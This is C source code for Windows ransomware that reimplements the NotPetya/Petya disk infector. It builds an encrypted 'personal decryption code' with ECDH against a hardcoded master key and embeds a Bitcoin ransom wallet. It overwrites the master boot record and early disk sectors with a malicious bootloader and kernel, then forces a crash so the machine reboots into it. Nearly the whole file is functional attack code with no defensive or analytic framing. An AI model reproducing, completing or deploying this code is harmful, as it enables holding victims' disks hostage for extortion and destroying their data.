#include <Windows.h>
#include <stdint.h>
#include "openssl/evp.h"
#include "openssl/ecdh.h"
#include "openssl/sha.h"
#include "openssl/aes.h"
#include "data.h"
#include "base58.h"
#include "endian.h"
#include "spongent.h"

#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")

//Janus public key
uint8_t PubKeyA[] = {
	0x04, 0xC4, 0x80, 0xAF, 0x98, 0x2B, 0x11, 0x26, 0x9C, 0xB4, 0x38, 0xA0,
	0x1C, 0x46, 0x79, 0xA8, 0x32, 0x9B, 0x5A, 0x5F, 0x4E, 0x80, 0x0C, 0x86,
	0x9E, 0xA3, 0xD5, 0x26, 0x77, 0xF3, 0x26, 0x1E, 0xC8, 0x8D, 0xD1, 0x71,
	0xEC, 0xA5, 0xA9, 0x06, 0x6F, 0x4D, 0x8F, 0x26, 0xDC, 0xA6, 0x48, 0xFE,
	0xF9
};

void aes_ecb_encrypt_chunk(uint8_t enc_buf[16], uint8_t *key_bytes)
{
    AES_KEY key;
    AES_set_encrypt_key(key_bytes, 256, &key);
    AES_ecb_encrypt(enc_buf, enc_buf, &key, AES_ENCRYPT);
}
void sha512(uint8_t *in_buffer, size_t in_buffer_len, uint8_t out_hash[SHA512_DIGEST_LENGTH])
{
    SHA512_CTX sha512;
    SHA512_Init(&sha512);
    SHA512_Update(&sha512, in_buffer, in_buffer_len);
    SHA512_Final(out_hash, &sha512);
}
size_t get_expanded_size(uint8_t *secret, size_t secret_len)
{
    uint32_t first_dword = 0;
    memcpy(&first_dword, secret, sizeof(uint32_t));
    first_dword = bbp_swap32(first_dword);

    uint32_t counter = 0x20;
    uint32_t curr = 0;
    size_t dif = 0;
    do {
        curr = first_dword;
        curr >>= (counter - 1);
        if (curr & 1) {
            break;
        }
        counter--;
        dif++;
    } while (counter);

    return (secret_len * 8) - dif;
}
uint8_t *expand_secret(uint8_t* secret, size_t out_secret_len)
{
    const size_t secret_data_size = get_expanded_size(secret, out_secret_len);
    uint8_t *secret_data = (uint8_t *)OPENSSL_malloc(secret_data_size);
    memset(secret_data, 0, secret_data_size);

    size_t secret_offset = secret_data_size - out_secret_len;

    memcpy(secret_data + secret_offset, secret, out_secret_len);

    return secret_data;
}

void hard_reboot() 
{
	HANDLE hProc;
	HANDLE TokenHandle;
	TOKEN_PRIVILEGES NewState;

	hProc = GetCurrentProcess();
	OpenProcessToken(hProc, 0x28u, &TokenHandle);
	LookupPrivilegeValueA(0, "SeShutdownPrivilege", (PLUID)NewState.Privileges);
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Attributes = 2;

	AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);

	HMODULE ntdll = GetModuleHandleA("NTDLL.DLL");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	DWORD tmp;
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000350, 0, 0, 0, 6, &tmp);
}

void GenerateRandomBuffer(BYTE *buffer, DWORD dwLen)
{
	HCRYPTPROV prov;
	CryptAcquireContextA(&prov, 0, 0, 1u, 0xF0000000);
	CryptGenRandom(prov, dwLen, buffer);
	CryptReleaseContext(prov, 0);
}
void ReadSector(char hHandle[18], INT iSectorCount, BYTE* cBuffer, DWORD nBytesToRead)
{
	HANDLE PhysicalDrive = CreateFileA(hHandle, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	DWORD lpTemporary;
	SetFilePointer(PhysicalDrive, iSectorCount * 512, 0, FILE_BEGIN);

	ReadFile(PhysicalDrive, cBuffer, nBytesToRead, &lpTemporary, 0);

	CloseHandle(PhysicalDrive);
}

void WriteSector(char hHandle[18], INT iSectorCount, BYTE *cBuffer, DWORD nBytesToWrite)
{
	HANDLE PhysicalDrive = CreateFileA(hHandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);
	DWORD lpTemporary;
	SetFilePointer(PhysicalDrive, iSectorCount * 512, 0, FILE_BEGIN);

	WriteFile(PhysicalDrive, cBuffer, nBytesToWrite, &lpTemporary, 0);

	CloseHandle(PhysicalDrive);
}

static unsigned char hexmap[] = "0123456789abcdef";

void base16_encode(BYTE key[16], BYTE outKey[32])
{
	for (int i = 0; i < 16; i++)
	{
		 outKey[2 * i + 0] = hexmap[(key[i] & 0xF0) >> 4];
		 outKey[2 * i + 1] = hexmap[key[i] & 0x0F];
	}
}

int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
	// Generate random Salsa20 key using CryptGenRandom
	uint8_t key[16];
	uint8_t salsa20key[16];
	GenerateRandomBuffer(salsa20key, 16);

	// Copy the generated salsa20key into key buffer
	memcpy(key + 0, salsa20key + 0, 16);

	// Public key cryptography secp192k1 using OpenSSL library
	const unsigned char* pub_key_buf;
	EC_KEY *VictimPrivateKey;
	const EC_POINT *MasterPubKey;
	const EC_POINT *VictimPubKey;
	EC_GROUP *secp192k1_group;
	unsigned char victim_pub_key_char[49];
	
	// Set our master public key
	EC_KEY *PeerPublicKey = EC_KEY_new_by_curve_name(NID_secp192k1);
	EC_KEY_set_conv_form(PeerPublicKey, POINT_CONVERSION_UNCOMPRESSED);
	pub_key_buf = PubKeyA;
	o2i_ECPublicKey(&PeerPublicKey, &pub_key_buf, 49);

	// Generate victim keypair on secp192k1 curve
	EC_KEY *VictimKeyPair = EC_KEY_new_by_curve_name(NID_secp192k1);
	EC_KEY_generate_key(VictimKeyPair);
	EC_KEY_set_conv_form(VictimKeyPair, POINT_CONVERSION_UNCOMPRESSED);
	VictimPrivateKey = VictimKeyPair;

	VictimPubKey = EC_KEY_get0_public_key(VictimKeyPair);

	secp192k1_group = EC_GROUP_new_by_curve_name(NID_secp192k1);

	// Convert victim public key to raw format
	BIGNUM *victim_pub;
	//
	victim_pub = EC_POINT_point2bn(secp192k1_group, VictimPubKey, POINT_CONVERSION_UNCOMPRESSED, NULL, NULL);
	BN_bn2bin(victim_pub, victim_pub_key_char);

	// Set our Master Public Key
	MasterPubKey = EC_KEY_get0_public_key(PeerPublicKey);

	// allocate the memory for the shared secret
	const size_t secret_len = 0x40;
	uint8_t *secret = (uint8_t *)OPENSSL_malloc(secret_len);
	memset(secret, 0, secret_len);

	// Calculate the shared secret based on ECDH and secp192k1 curve
	size_t out_secret_len = ECDH_compute_key(secret, secret_len, MasterPubKey, VictimPrivateKey, NULL);

	// Expand the secret
	uint8_t *to_hash = expand_secret(secret, out_secret_len);
	size_t to_hash_size = get_expanded_size(secret, out_secret_len);

	uint8_t out_buffer[SHA512_DIGEST_LENGTH];

	// Hash the expanded secret with SHA512
	sha512(to_hash, to_hash_size, out_buffer);

	// Free secret
	OPENSSL_free(secret);
	OPENSSL_free(to_hash);

	// Use the first 32 byte of SHA512 hash as AES 256 ECB key
	uint8_t AESKEY[32];
	memcpy(AESKEY + 0, out_buffer + 0, 32);

	// encrypt the Salsa20 key with AES 256 ECB using the first 32 bytes of SHA512 hash of secret as key
	aes_ecb_encrypt_chunk(salsa20key, AESKEY);

	// Destroy SHA512 hash of secret buffer
	memset(out_buffer, 0x00, SHA512_DIGEST_LENGTH);
	// Destroy AES KEY
	memset(AESKEY, 0x00, 32);

	// Put the victim public key and encrypted salsa20 key in a buffer
	uint8_t ec_temp_data[69];
	memset(ec_temp_data, 0x00, sizeof(ec_temp_data));
	memcpy(ec_temp_data + 0, victim_pub_key_char, 49);
	memcpy(ec_temp_data + 49, salsa20key, 16);

	//SHA512 Hash Buffer
	uint8_t digest[SHA512_DIGEST_LENGTH];

	//Calculate SHA512 checksum of ec_temp_data
	sha512(ec_temp_data, 69, digest);

	//Buffer for victim public key and encrypted Salsa20 key, as well as 2 byte SHA512 checksum
	uint8_t ec_data_full[71];
	memcpy(ec_data_full + 0, ec_temp_data, 69);
	memcpy(ec_data_full + 69, digest + 0, 2);

	// Buffer for base58 encoded victim public key and encrypted Salsa20 key as well as 2 byte SHA512 checksum
	uint8_t ec_session_data_b58[96];

	// Base58 encode the victim public key and encrypted salsa20 key as well as 2 byte SHA512 checksum
	base58_encode((const char*)ec_data_full, 71, ec_session_data_b58, 96);

	DWORD wb;
	VOLUME_DISK_EXTENTS diskExtents; // disk extents buffer
	char buffer[6];
	char system[MAX_PATH];
	memset(system, 0x00, sizeof(system));
	GetSystemDirectoryA(system, sizeof(system)); // Get system directory to get the drive letter on which OS is installed on
	char path[] = "\\\\.\\";
	char NUL[]="\0";

	// Make buffer that contains \\.\ + logical drive letter + :
	memcpy(buffer + 0, path + 0, 4);
	memcpy(buffer + 4, system + 0, 1);
	memcpy(buffer + 5, ":" + 0, 1);
	memcpy(buffer + 6, NUL + 0, 1);

	// Open the Logical Drive in which OS is installed in
	HANDLE LogicalDrive = CreateFileA(buffer, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	// Exit if logical drive is not accessible
	if (LogicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}
 
	// Get the Logical Drive disk extents
	DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0, 0, &diskExtents, sizeof(diskExtents), &wb, 0);

	// Close Logical drive handle
	CloseHandle(LogicalDrive);

	// If the OS partition starts before sector 40 on hard drive then stop the infection process
	if(diskExtents.Extents[0].StartingOffset.QuadPart / 512 < 0x28) { ExitProcess(0); } else {
	
	char physicaldevice[] = "\\\\.\\PhysicalDrive";
 
	// buffer that will contain \\.\PhysicalDrive + disknumber
	char buf[18];

	// convert disk number to decimal number
	__asm{

		add diskExtents.Extents[0].DiskNumber, 30h
	}

	// Make buffer that will contains \\.\PhysicalDrive + disknumber
	memcpy(buf + 0, physicaldevice, 17);
	memcpy(buf + 17, &diskExtents.Extents[0].DiskNumber, 1);
	memcpy(buf + 18, NUL + 0, 1);

	// Open primary hard disk
	HANDLE PhysicalDrive = CreateFileA(buf, GENERIC_READ | 0x100000, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	// Exit if hard disk is not accessible
	if (PhysicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}

	BYTE XORMBR[512]; // MBR XORed with 0x07 byte buffer
	BYTE sector32Buffer[512]; // sector 32 buffer
	BYTE sector33Buffer[512]; // sector 33 buffer
	BYTE NewMbr[512]; // NewMbr buffer
	BYTE OldMbr[512]; // Original MBR buffer

	memset(sector32Buffer, 0x00, 512); // Fill sector 32 buffer with 0x00

	char Wallet[] = "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX";

	BYTE userkey[32];

	base16_encode(key, userkey); // Base16 encode the random Salsa20 key

	memset(key, 0x00, 16); // destroy raw salsa20 key

	BYTE Salsa20KeyHash[32];

	memset(state, 0x00, B); //clear SPONGENT 256/256/16 state

	spongent(userkey, 32, Salsa20KeyHash); //Hash the random Salsa20Key using SPONGENT 256/256/16 hashing

	memset(userkey, 0x00, 32); // destroy salsa20 userkey

	//128 rounds of SPONGENT 256/256/16
	for (int i = 0; i < 128; i++)
	{
		spongent(Salsa20KeyHash, 32, Salsa20KeyHash);
	}

	memset(state, 0x00, B); //clear SPONGENT 256/256/16 state

	// Generate random 8 byte nonce using CryptGenRandom
	BYTE nonce[8];
	GenerateRandomBuffer(nonce, 8);

	//Make sector 32 buffer containing, 32 byte Salsa20KeyHash, 8 byte random nonce, BTC Wallet and personal decryption code
	//Personal decryption code is encrypted random salsa20 key using public key cryptography secp192k1 based on petya authors Public key and base58 encoded
	memcpy(sector32Buffer + 1, Salsa20KeyHash, 32);
	memcpy(sector32Buffer + 33, nonce, 8);
	memcpy(sector32Buffer + 41, Wallet, 34);
	memcpy(sector32Buffer + 169, ec_session_data_b58, 96);

	memset(Salsa20KeyHash, 0x00, 32); // Destroy hash

	memset(sector33Buffer, 0x07, 512); // Fill sector 33(verification sector) buffer with 0x07

	//Get the harddisk info
	PARTITION_INFORMATION_EX info;
	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, 0, 0, &info, sizeof(info), &wb, 0);
	CloseHandle(PhysicalDrive);
	
	// IF DISK IS MBR
	if(info.PartitionStyle == PARTITION_STYLE_MBR)
	{
		ReadSector(buf, 0, XORMBR, 512); // Read original MBR from sector 0
		for (int i = 0; i < 512; i++)XORMBR[i] ^= 0x07; // XOR every byte of original MBR with 0x07

		// Construct NotPetya MBR with disk id and partition table from Original MBR in it
		ReadSector(buf, 0, OldMbr, 512);
		memcpy(NewMbr,bootloader,512);
		memcpy(NewMbr + 440, OldMbr + 440, 70);

		// Write NotPetya MBR to sector 0
		WriteSector(buf, 0, NewMbr, 512);

		// Write NotPetya 16 bit kernel to sector 1-19
		WriteSector(buf, 1, kernel, sizeof(kernel));
		
		// Write configuration buffer to sector 32
		WriteSector(buf, 32, sector32Buffer, 512);

		// Write verification sector to sector 33
		WriteSector(buf, 33, sector33Buffer, 512);

		// Write original MBR XORed with 0x07 to sector 34
		WriteSector(buf, 34, XORMBR, 512);

		// Call NtRaiseHardError with code 0xc0000350(STATUS_HOST_DOWN) to cause BSOD
		hard_reboot();
	}
	// NO GPT SUPPORT!
	else if(info.PartitionStyle == PARTITION_STYLE_GPT)
	{
		ExitProcess(0);
	}
	}
}